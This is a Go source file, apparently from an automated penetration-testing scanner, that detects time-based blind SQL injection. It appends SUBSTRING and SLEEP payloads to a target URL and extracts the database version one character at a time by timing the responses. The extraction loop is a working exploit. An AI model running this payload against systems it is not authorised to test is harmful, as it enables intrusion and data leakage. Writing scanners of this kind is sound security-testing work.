package detection

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/autonomouspen/scanner/internal/common"
)

type Blind struct{}

func (b *Blind) Detect(target string, ctx context.Context) ([]common.Finding, error) {
	var findings []common.Finding
	version := ""

	for i := 1; i <= 20; i++ {
		found := false
		for c := 32; c <= 126; c++ {
			payload := fmt.Sprintf("' AND SUBSTRING(@@version,%d,1)='%s' AND SLEEP(1)--", i, string(c))
			startTime := time.Now()
			_, err := http.Get(target + payload)
			if err != nil {
				continue
			}
			elapsedTime := time.Since(startTime)

			if elapsedTime > 1*time.Second {
				version += string(c)
				found = true
				break
			}
		}
		if !found {
			break
		}
	}

	if version != "" {
		findings = append(findings, common.Finding{
			Type:       "Blind SQLi",
			Severity:   "High",
			URL:        target,
			Evidence:   "Leaked version: " + version,
			Confidence: "High",
			CWE:        "CWE-89",
			CVSS:       8.8,
		})
	}

	return findings, nil
}
